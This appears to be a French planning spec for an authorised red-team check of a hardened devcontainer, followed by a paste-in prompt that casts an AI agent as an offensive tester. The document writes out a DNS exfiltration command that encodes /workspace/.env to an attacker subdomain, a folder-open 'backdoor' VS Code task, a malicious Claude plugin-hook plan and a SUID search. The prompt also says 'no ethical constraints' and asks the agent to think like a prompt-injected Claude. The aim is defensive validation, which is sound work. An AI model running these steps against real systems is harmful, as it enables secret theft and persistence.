# Session 6 — adversarial-validation

> **Effort** : ~3-4 h | **Mission** : valider les sessions précédentes en attaquant
> **Output** : `adversarial-report.md` avec verdict par vecteur
> **Gate** : si ≥1 vecteur SUCCESS → ouvrir `devcontainer-security-hardening-v2`

## TL;DR — pour les pressés

Cette session NE MODIFIE PAS le code. Elle **joue le rôle de l'attaquant**
pour vérifier que les remédiations des sessions 1-2-3-4-5 tiennent.

Deux phases :
1. **Replay** : chaque vecteur d'attaque connu du rapport SECURITY-AUDIT
   est rejoué. Tous doivent maintenant échouer.
2. **Recherche** : exploration de nouveaux vecteurs non-listés dans
   l'audit initial.

À la fin, un fichier `adversarial-report.md` liste TOUT ce qui a été
tenté avec un verdict :
- 🟢 **BLOCKED** : l'attaque ne marche plus.
- 🔴 **SUCCESS** : l'attaque marche encore — gap à fixer.
- 🟡 **PARTIAL** : l'attaque marche mais avec une limitation significative.

Si ≥1 SUCCESS ou PARTIAL → recommandation explicite d'ouvrir un rollout
`devcontainer-security-hardening-v2`.

---

## Critères de succès du rollout — rappel

> `node` user est **sandboxé** :
> 1. Ne peut PAS relancer la machine seul
> 2. Ne peut PAS modifier le firewall sans rebuild
> 3. Ne peut PAS accéder à une ressource externe / exfiltrer sans rebuild

Tout vecteur qui viole l'un de ces critères = SUCCESS de l'attaque
= remédiation insuffisante.

---

## Phase 1 — Replay des vecteurs connus

Pour chaque vecteur du rapport
[`.devcontainer/SECURITY-AUDIT-2026-05.md`](../../../.devcontainer/SECURITY-AUDIT-2026-05.md),
exécuter le PoC documenté. Le verdict attendu après sessions 1-5 est dans
la colonne "Expected".

### Tableau des replays

| # | Vecteur | PoC | Session de remédiation | Verdict expected |
|---|---|---|---|---|
| 1 | `domains.local.txt` poison | Edit + reload | 1 | BLOCKED |
| 2 | `addons/*.py` Python injection | Edit + reload | 1 | BLOCKED |
| 3 | `dnsmasq.conf` poison | Edit + reload | 1 | BLOCKED |
| 4 | `/tmp/.firewall-env` source-as-root | `sudo init-firewall.sh` | 2 | BLOCKED |
| 5 | Claude hooks injection | Modify settings.json | 3 (optional) | BLOCKED si session 3 faite |
| 6 | `shell-init.sh` backdoor | Edit + new shell | (accepted — node-level) | TOLERATED |
| 7 | `vscode-settings.json` auto-run | Edit `.vscode/tasks.json` | (accepted — node-level) | TOLERATED |
| 8 | `policy.d/*.yaml` élargissement | Edit + reload | 1 | BLOCKED |
| 9 | DNS exfil wildcards | Requête DNS via `*.allowed.com` | (gap P3) | PARTIAL (out of scope) |
| 10 | `firewall-blocks` runtime call | À investiguer | 1 ou 6 | À DÉTERMINER |
| 11 | Mitm logs lisibles | `cat /var/log/mitmproxy*` | 5 (optional) | BLOCKED si session 5 faite |
| (new) | Toggle firewall-mode via `.configured-firewall-mode` | Edit + reload | 4 | BLOCKED |
| (new) | `CLAUDE_CODE_FIREWALL_ALLOWED` via `.env` | Edit + reload | 4 | BLOCKED |

### Procédure de replay

Pour chaque ligne du tableau, dans le container après rebuild final :

```bash
# 1. Setup : note l'état initial
ls /tmp/pwned-* 2>/dev/null  # → expected empty
sudo iptables -S OUTPUT | head -5

# 2. Exécution du PoC (cf. SECURITY-AUDIT-2026-05.md §"PoC vecteur N")

# 3. Si requis : trigger reload
#    Soit via "docker compose restart <service>" depuis l'host
#    Soit via "VS Code → Reload Window"
#    Documenter laquelle.

# 4. Vérification
#    - L'effet attendu de l'attaque NE doit PAS se produire
#    - Documenter la commande exacte de vérif + son output

# 5. Verdict : BLOCKED / SUCCESS / PARTIAL
#    Justifier avec l'output observé.
```

### Template d'entrée dans `adversarial-report.md`

```markdown
## Vecteur N — <nom>

**Source** : SECURITY-AUDIT-2026-05.md §"Vecteurs N"
**Session de remédiation** : N (ou "out of scope — accepted")
**Verdict** : 🟢 BLOCKED

**PoC exécuté** :
```bash
$ echo "evil.com" >> /workspace/.devcontainer/firewall/domains.local.txt
$ # reload via "VS Code → Reload Window"
```

**Effet attendu (sans fix)** : evil.com dans l'ipset après reload.

**Effet observé (après session N)** :
```
$ sudo ipset list allowed-domains | grep evil
(no match)
$ grep evil /etc/devcontainer-firewall/domains.local.txt
(file is image-baked, no evil entry — workspace edit had no effect)
```

**Notes** : ...
```

---

## Phase 2 — Recherche de nouveaux vecteurs

Exploration active de surfaces NON couvertes par le rapport initial.
Pour chaque ligne, tenter une attaque concrète et documenter.

### Inventaire des surfaces à explorer

#### Group A — Volumes Docker named

| Surface | Path container | Risque |
|---|---|---|
| `claude-creds-<proj>` | `/home/node/.claude-creds/` | Tokens OAuth Anthropic |
| `claude-config-<proj>` | `/home/node/.claude/` | `settings.json`, `plugins/`, `.claude.json` |
| `mitmproxy-<proj>` | `/var/lib/mitmproxy/` | CA root mitm |
| `bash-history` | `/commandhistory/` | Historique shell |

**Tentatives** :
- Lire `/home/node/.claude-creds/.credentials.json` (tokens) → already
  accessible to node, **TOKEN EXFIL VECTOR HOT** — mais limité par le
  firewall (token est utile pour authentifier à api.anthropic.com, déjà
  allowed → quota abuse, pas data exfil)
- Lire `/var/lib/mitmproxy/mitmproxy-ca-cert.pem` → `chmod 0600
  mitmproxy:mitmproxy`, node ne devrait pas pouvoir
- Inspecter `/commandhistory/.zsh_history` → peut contenir des secrets
  tapés au prompt

#### Group B — Side-channels via /proc

| Surface | Risque |
|---|---|
| `/proc/<pid>/environ` | Lecture des env vars d'un autre process |
| `/proc/<pid>/cmdline` | Args d'autres process |
| `/proc/net/tcp` | Liste des connexions ouvertes |
| `/proc/<pid>/fd/*` | Symlinks vers fichiers ouverts |

**Tentatives** :
- `cat /proc/$(pidof mitmdump)/environ` → si node n'est pas mitmproxy
  UID, devrait être bloqué (mode 400 par defaut Linux)
- `cat /proc/$(pidof dnsmasq)/cmdline` → public, OK
- `cat /proc/net/tcp` → public, peut révéler des dst ports actifs

#### Group C — Plugins Claude Code

Session 3 (optional) ne couvre que `settings.json` hooks. Les plugins
peuvent installer leurs propres hooks via :
- `~/.claude/plugins/<plugin-name>/hooks.json`
- `~/.claude/plugins/<plugin-name>/skill.json`

**Tentatives** :
- Créer un plugin malicieux à `~/.claude/plugins/evil/hooks.json` avec
  un hook PreToolUse → vérifier s'il est exécuté par Claude
- Si oui : SUCCESS = gap à couvrir en v2

#### Group D — VS Code config files

- `.vscode/tasks.json` avec `runOptions.runOn: "folderOpen"` — exécute
  au folder open
- `.vscode/launch.json` avec auto-debug config
- Settings VS Code `terminal.integrated.env.linux` → injection env vars

**Tentatives** :
- Créer `.vscode/tasks.json` avec une task `folderOpen` qui touche
  `/tmp/pwned-via-task` → trigger via fermeture-réouverture du folder
- Verdict : si pwned-via-task existe = SUCCESS

#### Group E — DNS exfil via wildcards allowlistés

Cf. gap P3 du SECURITY.md. Pas remediable trivialement, mais documenter
exactement ce qu'on peut faire.

**Tentatives** :
- Faire une requête `<base64-data>.statsig.com` → si le DNS query
  est forwarded à 8.8.8.8 + un attaquant contrôle un NS, il capture
- Tester `<data>.githubusercontent.com` (GitHub Pages)

Note : ces tentatives ne sont pas un exfil "garanti" — elles
illustrent un canal théorique.

#### Group F — `claude-creds` cross-projet

Si `claude-creds` volume est partagé (external: true), un projet
malicieux peut lire les tokens d'un autre projet.

**Tentatives** :
- Vérifier la configuration `external: true` et le naming
- Tenter de monter le volume d'un autre projet (depuis host) et lire

#### Group G — TOCTOU sudo'd scripts

Les scripts sudo'ables (`init-firewall.sh`, `test-firewall.sh`,
`firewall-env-write`, `claude-logs`) lisent-ils des fichiers que `node`
peut modifier entre la lecture et l'utilisation (time-of-check-to-time-of-use) ?

**Tentatives** :
- `firewall-env-write` lit `$1`, `$2`... — pas de fichier intermédiaire,
  pas de TOCTOU
- `init-firewall.sh` lit `/etc/devcontainer-firewall/default-mode` —
  baked, ro, pas de TOCTOU
- `claude-logs` lit `/var/log/mitmproxy*.log` — owned by mitmproxy,
  node ne peut pas remplacer

#### Group H — Network side-channels

- **Timing** : mesurer latence des CONNECT mitmproxy pour inférer si
  un host est allowed (binary leak)
- **Content-Length** : observer les tailles de réponses pour fingerprinter
- **DNS timing** : NXDOMAIN vs success time

**Tentatives** :
- Documenter ces canaux. Out of scope sécurité pratique mais à noter.

#### Group I — Container metadata

- `/proc/self/mountinfo` peut révéler la structure des bind-mounts
- `dmesg` (si accessible)
- `env` du shell — révèle les vars rendues par docker-compose

**Tentatives** :
- `cat /proc/self/mountinfo | grep firewall` → expose les bind-mounts
- `env | grep -i firewall` → expose les vars

#### Group J — Capabilities et namespaces

Le container a `NET_ADMIN` + `NET_RAW`. Node peut-il abuser ?

**Tentatives** :
- `sudo iptables -F` → bloqué par sudoers (init-firewall.sh est
  whitelisté mais pas iptables direct)
- `sudo ip route` → pas dans sudoers, bloqué
- Direct `iptables` sans sudo → permission denied (UID non-root sans
  CAP_NET_ADMIN délégué)

#### Group K — Helpers existants utilisés à mauvais escient

- `test-firewall.sh` lit `/etc/devcontainer-firewall/tests/probes.txt` —
  baked, pas TOCTOU
- `firewall-blocks` (vecteur #10 du rapport — à confirmer) — runtime
  call ou build-only ?

**À investiguer en session 6** : où / quand `firewall-blocks` est-il
appelé ? S'il est lu d'un chemin bind-monté workspace, c'est un vecteur.

---

## Output : `adversarial-report.md`

Structure du fichier final (à créer dans
`plans/devcontainer-security-hardening/adversarial-report.md`) :

```markdown
# Adversarial validation report

**Date** : 2026-05-DD
**Tester** : <user>
**Container state** : sessions 1, 2, [3], 4, [5] delivered, fully rebuilt
**Criteria** : (1) node cannot restart machine alone (2) node cannot modify
firewall without rebuild (3) node cannot exfil data without rebuild

## Phase 1 — Replay (13 vectors)

[un block par vecteur, template fourni dans session-6 spec]

## Phase 2 — New surface exploration

### Group A — Docker volumes
...

### Group B — /proc side-channels
...

[etc]

## Verdict global

| Status | Count |
|---|---|
| 🟢 BLOCKED | N |
| 🟡 PARTIAL | N |
| 🔴 SUCCESS | N |

## Recommendation

[CASE 1 : zero SUCCESS, zero PARTIAL]
✅ Rollout complete. node user is sandboxed per the 3 stated criteria.
Defense-in-depth follow-ups (sessions 3, 5) optional.

[CASE 2 : ≥1 PARTIAL, zero SUCCESS]
🟡 Rollout largely complete. PARTIAL cases documented as accepted gaps.
Consider follow-up rollout for full hardening if needed.

[CASE 3 : ≥1 SUCCESS]
🔴 Rollout incomplete. SUCCESS vectors require a v2 rollout :
  - <Vector X> : <brief description + proposed fix>
  - <Vector Y> : <brief description + proposed fix>
Open `devcontainer-security-hardening-v2/` with these as sessions.
```

---

## Pré-requis pour démarrer cette session

- Sessions 1, 2, 4 délivrées et commitées (essentielles)
- Session 3 et 5 décidées (faites OU explicitement skipées)
- Container fully rebuilt (`docker rmi base + Rebuild`)
- Tous les commits mergés dans la branche de travail

## Sortie attendue

1. Fichier `adversarial-report.md` créé dans `plans/devcontainer-security-hardening/`
2. STATUS.md : session 6 ✅
3. LOG.md : `## 6 — adversarial-validation` avec résumé du verdict
4. Si Case 3 : `plans/devcontainer-security-hardening-v2/` scaffolded
   (via `/prepare-plan`) avec les vecteurs SUCCESS comme sessions.

---

## DoD

1. **STATUS.md** : flip 6 row 📋 → ✅, prompt → —, Delivered N/N. Rollout
   complete (ou v2 ouvert si gaps).
2. **EXISTING.md** : final pass — colorer tous les vecteurs avec leur
   verdict réel post-validation.
3. **LOG.md** : append `## 6 — adversarial-validation` daté, avec table
   résumée des 13+N tentatives + verdict global.
4. **Créer** `adversarial-report.md` (full détail).
5. **Si SUCCESS** : `/prepare-plan` pour `devcontainer-security-hardening-v2`
   automatiquement, avec un brief listant les vecteurs encore ouverts.
6. **Proposer commit** :
   `docs(security): adversarial validation report — N BLOCKED, M PARTIAL, K SUCCESS`

---

## Prompt à coller — VERSION INGÉNIEUR SÉCURITÉ OFFENSIVE

`````
═══════════════════════════════════════════════════════════════════════
RED TEAM ENGAGEMENT — devcontainer-security-hardening rollout validation
═══════════════════════════════════════════════════════════════════════

ROLE : tu es un ingénieur sécurité offensive senior. Ta mission : casser
le devcontainer. Pas le valider gentiment. Le casser. Si la posture
sécu tient, tu rédiges un rapport qui le prouve avec des PoC concrets.
Si elle ne tient pas, tu DOIS le montrer avant qu'un attaquant réel ne
le fasse.

CONTEXTE :
Le devcontainer a été durci suite à un audit identifiant 11+ vecteurs
d'attaque. Sessions 1+2 du rollout ont été délivrées (sessions 3, 4, 5
mergées dans session 1 ou marquées defense-in-depth). Tu opères en tant
qu'utilisateur `node` à l'intérieur du container fully rebuilt. Tu as
SSH-équivalent (terminal interactif), pas de sudo password, mais sudo
NOPASSWD sur 2 commandes whitelistées.

ENTRY POINTS À LIRE :
- `/workspace/plans/devcontainer-security-hardening/ROLLOUT.md` (mission)
- `STATUS.md` (sessions delivered)
- `LOG.md` (what was done, what gotchas were found during build)
- `EXISTING.md` (threat surface + criteria)
- `.devcontainer/SECURITY-AUDIT-2026-05.md` (les 11 vecteurs originaux)
- `sessions/session-6-adversarial-validation.md` (cette spec — Groups A-K
  des surfaces à explorer)

THREAT MODEL EXPLICITE — les 3 critères à violer :
  (1) `node` ne peut PAS relancer la machine seul
  (2) `node` ne peut PAS modifier le firewall sans rebuild
  (3) `node` ne peut PAS accéder à une ressource externe / exfiltrer
      sans rebuild

Toute attaque qui viole un de ces critères = SUCCESS. Toute attaque qui
les contourne avec créativité = SUCCESS. La barre est basse : si tu
peux exfiltrer 1 octet vers un host non-allowed, c'est un succès.

═══════════════════════════════════════════════════════════════════════
MISSION — 3 PHASES
═══════════════════════════════════════════════════════════════════════

PHASE 1 — REPLAY (~1h)
─────────────────────────
Rejoue chaque vecteur du SECURITY-AUDIT-2026-05.md. Pour chacun :
- Exécute le PoC documenté
- Observe l'effet réel
- Verdict : 🟢 BLOCKED (PoC échoue) / 🔴 SUCCESS (PoC marche) / 🟡 PARTIAL
- Documente dans `adversarial-report.md` AVEC le diff exact des
  outputs (avant vs après)

Liste à replayer (ATTENTION : compléter avec les vecteurs trouvés
en cours d'audit) :
  - #1 domains.local.txt poison
  - #2 addons/*.py Python injection
  - #3 dnsmasq.conf poison
  - #4 /tmp/.firewall-env source-as-root
  - #5 Claude hooks injection (note : si session 3 skipped, vérifier
    si exploitable et si oui, est-ce dans les 3 critères ?)
  - #6 shell-init.sh backdoor (TOLERATED par design — accepter)
  - #7 vscode-settings.json (TOLERATED par design — accepter)
  - #8 policy.d/*.yaml élargissement
  - #9 DNS wildcards exfil (P3 connu, document if exploitable)
  - #10 firewall-blocks runtime call (INVESTIGATE : est-ce un vrai
    vecteur runtime ou build-only ?)
  - #11 mitm logs lisibles (si session 5 skipped, OUT OF SCOPE)
  - #12 FIREWALL_MODE=off via .configured-firewall-mode
  - #13 CLAUDE_CODE_FIREWALL_ALLOWED=evil:443 via .env

PHASE 2 — RECHERCHE ACTIVE DE NOUVEAUX VECTEURS (~2h, le cœur du travail)
─────────────────────────────────────────────────────────────────────────
Tu es maintenant un attaquant créatif. Tu as accès à `node`. Tu veux
exfiltrer `/workspace/.env`. Aucune contrainte d'éthique, aucune limite
de "ce qui devrait marcher".

Pour CHAQUE groupe ci-dessous, tente concrètement, observe le résultat,
documente. Sois exhaustif. Si tu trouves quelque chose, exploite-le à
fond pour voir jusqu'où ça va.

GROUP A — VOLUMES DOCKER NAMED (~15 min)
  - `cat /home/node/.claude-creds/.credentials.json` : OAuth tokens
    visibles ? Si oui, peux-tu authentifier api.anthropic.com avec ?
    Test : `curl -H "Authorization: Bearer <token>" https://api.anthropic.com/v1/models`
    via HTTPS_PROXY=127.0.0.1:8080
  - Le token permet-il d'**exfiltrer** des données ? L'API Anthropic
    n'a normalement pas d'endpoint "read past conversations" — vérifier
  - `/var/lib/mitmproxy/mitmproxy-ca-cert.pem` : lisible par node ?
    Permissions ? Si oui, peux-tu signer un certificat malicieux ?
  - `/commandhistory/.zsh_history` : secrets accidentellement tapés
    au prompt ? Lis le contenu.

GROUP B — SIDE-CHANNELS /proc (~15 min)
  - `cat /proc/$(pidof mitmdump)/environ` : env vars du mitmproxy.
    Contient-il un secret ? (les addons sont configurés via path, pas
    via env, donc probablement non, mais vérifier)
  - `cat /proc/$(pidof dnsmasq)/cmdline` : args dnsmasq
  - `cat /proc/net/tcp` : liste des connexions actives (dst:port)
  - `cat /proc/self/mountinfo` : structure des bind-mounts —
    révèle-t-elle un chemin baked qu'on pourrait remplacer ?
  - `ls -la /proc/*/fd/` : symlinks vers fichiers ouverts par d'autres
    process. Peux-tu lire les fichiers ouverts par mitmproxy via les
    fd ? (typically Permission denied par UID séparé, mais TRY)

GROUP C — PLUGINS CLAUDE CODE (~30 min — vecteur potentiel sérieux)
  - Crée un plugin malicieux dans `~/.claude/plugins/evil-plugin/`
    avec :
      - `plugin.json` (manifest)
      - `hooks.json` contenant un `PreToolUse` ou `PostToolUse` hook
  - Trigger une action Claude (commande arbitraire)
  - Le hook s'exécute-t-il ? Si oui, est-ce que ça permet d'exfil
    (= violation critère 3) ?
  - Si SUCCESS : c'est un vecteur majeur non-couvert.

GROUP D — VS CODE CONFIG AUTO-RUN (~30 min)
  - Crée `.vscode/tasks.json` avec :
      {"version":"2.0.0","tasks":[{"label":"backdoor","type":"shell",
       "command":"touch /tmp/pwned-via-task",
       "runOptions":{"runOn":"folderOpen"}}]}
  - Ferme et rouvre le folder dans VS Code
  - `/tmp/pwned-via-task` existe ? Si oui, SUCCESS (mais vérifier
    si firewall bloque l'exfil — c'est juste node trigger)
  - Test similaire avec `.vscode/launch.json` auto-debug
  - Test avec `terminal.integrated.env.linux` qui injecte une var
    dans tous les shells

GROUP E — DNS EXFIL VIA WILDCARDS ALLOWLISTÉS (~30 min — gap P3 connu)
  - Domains wildcards dans l'allowlist : `*.statsig.com`, `*.sentry.io`,
    `*.vsassets.io`, `*.gallerycdn.vsassets.io`, `*.vo.msecnd.net`,
    `*.githubusercontent.com`
  - Tente DNS exfil : `dig $(base64 -w0 /workspace/.env).attacker.statsig.com`
    via 127.0.0.53 (dnsmasq)
  - dnsmasq forward-il vers 8.8.8.8 ? Si oui, l'attaquant qui contrôle
    `*.attacker.statsig.com` (hypothétique mais réaliste avec subdomain
    takeover) reçoit l'encodage
  - Sur `*.githubusercontent.com` : peut-on créer un user GitHub Pages
    et utiliser `<malicious-user>.github.io` ?

GROUP F — CLAUDE-CREDS CROSS-PROJET (~15 min)
  - Le volume `claude-creds` est marqué `external: true` dans
    docker-compose.yml. Naming pattern : `claude-creds-${DC_PROJECT}`
  - Tente de monter un volume d'un autre projet (depuis HOST côté
    docker, pas inside le container — sortir du périmètre node)
  - Cross-pollination de tokens entre projets ?

GROUP G — TOCTOU SUR LES SUDO'D SCRIPTS (~20 min)
  - `sudo init-firewall.sh` — quels fichiers lit-il pendant son
    exécution ?
  - Peux-tu remplacer un fichier qu'il lit ENTRE le moment où il check
    (par exemple `[ -f path ]`) et le moment où il l'utilise (par
    exemple `cat path` ou `source path`) ?
  - TRY : inotifywatch + fast replacement of files in /etc/... (RO
    side, mais via /proc/<pid>/root/... ?)
  - `test-firewall.sh` : pareil — TOCTOU possible ?

GROUP H — NETWORK SIDE-CHANNELS (~15 min, low priority)
  - Timing : mesure latence pour determiner si un host est allowed
  - Content-length : observe les tailles pour fingerprinter
  - NXDOMAIN vs success delay
  - Documenter même si non-exploitable directement

GROUP I — CONTAINER METADATA EXPOSURE (~10 min)
  - `env | grep -i -E "(token|secret|key|pass)"` — leak via env
  - `cat /proc/self/mountinfo | grep -E "(firewall|claude)"`
  - `mount | grep ro` — révèle les bind mounts RO
  - `dmesg` accessible ?
  - `cat /etc/passwd` — utilisateurs définis, dont mitmproxy
  - `getent group adm` — qui est dans `adm` ? (session 5 retire node,
    vérifier)

GROUP J — CAPABILITIES ABUSE (~20 min)
  - Le container a `NET_ADMIN` + `NET_RAW`
  - Node SANS sudo : peut-il manipuler iptables directement ?
    `iptables -L` (typically capability-restricted, mais TRY)
  - `ip link add` / `tc qdisc` / autres outils netfilter
  - `tcpdump` avec CAP_NET_RAW ? (typically root-only, mais le cap
    est sur le container)
  - Si node peut sniffer le traffic mitmproxy via CAP_NET_RAW → leak
    massif (toutes les requêtes Anthropic visibles)

GROUP K — HELPERS EXISTANTS DÉTOURNÉS (~20 min)
  - `firewall-blocks` : où est-il appelé ? (cf. vecteur #10 audit)
    Read le script `mitm-init.sh` pour confirmer.
  - `test-firewall.sh` : peux-tu lui faire produire un output qui
    leak des données ?
  - `claude-logs` (si session 5 done) : input fuzzing — quelle taille
    max pour `--filter` ? Caractères acceptés ?

GROUP L — NOUVELLES SURFACES, créativité libre (~30 min)
  Cherche des surfaces qu'on a peut-être pas listées :
  - Hooks shell autres que .bashrc/.zshrc (PROMPT_COMMAND, etc.)
  - `~/.profile`, `~/.zshenv`, `~/.zlogin`
  - cron / systemd user / at — accessibles ?
  - inotify-watching des fichiers privilégiés
  - LD_PRELOAD si tu trouves un binaire SUID
  - SUID binaries dans /usr/local/bin/, /usr/bin/, etc.
    `find / -perm -4000 -type f 2>/dev/null`
  - `/var/run/docker.sock` exposé ? (typically no, mais check)
  - Reverse shell via mitmproxy si tu peux contrôler un domaine allowed

═══════════════════════════════════════════════════════════════════════
PHASE 3 — REPORT (~30 min)
═══════════════════════════════════════════════════════════════════════

Compile `plans/devcontainer-security-hardening/adversarial-report.md` :

```markdown
# Adversarial validation report

**Date** : YYYY-MM-DD
**Tester** : <user>
**Container state** : sessions delivered : <list>
**Container rebuild** : <hash de l'image base + project>
**Criteria** : (1) node restart, (2) firewall modif, (3) exfil

## Phase 1 — Replay (N vectors)

[Bloc par vecteur, format spec ci-dessus, AVEC outputs réels]

## Phase 2 — Surface exploration

### A — Docker volumes
[Tentatives + résultats]

### B — /proc
[idem]

[... etc pour A-L]

## Phase 3 — Verdict

| Status | Count |
|---|---|
| 🟢 BLOCKED | N |
| 🟡 PARTIAL | N |
| 🔴 SUCCESS | N |

### Liste des SUCCESS (si applicable)

1. Vector X : <description courte>
   PoC : <commande>
   Effet observé : <output>
   Impact : violation critère <1|2|3>
   Fix proposé : <ligne directrice>

[etc]

## Recommendation

[CASE 1 — Zero SUCCESS, Zero PARTIAL]
✅ Rollout complete. node user is sandboxed per the 3 criteria.

[CASE 2 — Zero SUCCESS, ≥1 PARTIAL]
🟡 Rollout largely complete with documented accepted gaps.

[CASE 3 — ≥1 SUCCESS]
🔴 Rollout INCOMPLETE. The following vectors are exploitable :
- ...
A v2 rollout MUST be opened to address these.

Recommandation explicite : ouvrir
`plans/devcontainer-security-hardening-v2/` via `/prepare-plan` avec
les vecteurs SUCCESS comme sessions.
```

═══════════════════════════════════════════════════════════════════════
RÈGLES D'ENGAGEMENT
═══════════════════════════════════════════════════════════════════════

DO :
- Tente des combinaisons (vecteur A + vecteur B = nouveau vecteur C)
- Cherche les angles morts : "qu'est-ce que personne n'a pensé à
  protéger ?"
- Si tu trouves un SUCCESS, ne t'arrête pas — exploit-le pour voir
  jusqu'où il va (ex : un read primitive → peux-tu chainer en write
  primitive ?)
- Documente l'output BRUT (copy-paste, pas paraphrase) dans le report
- Pose-toi la question "si j'étais Claude prompt-injected par un fichier
  malicieux du workspace, comment je m'y prendrais ?"

DON'T :
- Ne fais pas confiance au design "ça devrait être sécurisé" — TESTE
- Ne saute pas un Group "parce que ça parait peu probable"
- Ne dis pas "SUCCESS partiel" pour gonfler — sois rigoureux : SUCCESS
  = critère violé, point.
- Ne te limite pas aux PoC documentés — invente

À LA FIN :
1. `adversarial-report.md` créé et exhaustif
2. STATUS.md : session 6 flippée ✅
3. LOG.md : append `## 6 — adversarial-validation` avec verdict summary
4. SI ≥1 SUCCESS : appelle `/prepare-plan` pour créer
   `devcontainer-security-hardening-v2` avec les vecteurs SUCCESS
5. Propose commit (NE PAS commit sans confirmation user) :
   `docs(security): adversarial validation report — N BLOCKED, M PARTIAL, K SUCCESS`

GO HARD. Le but c'est la vérité, pas le confort.
`````
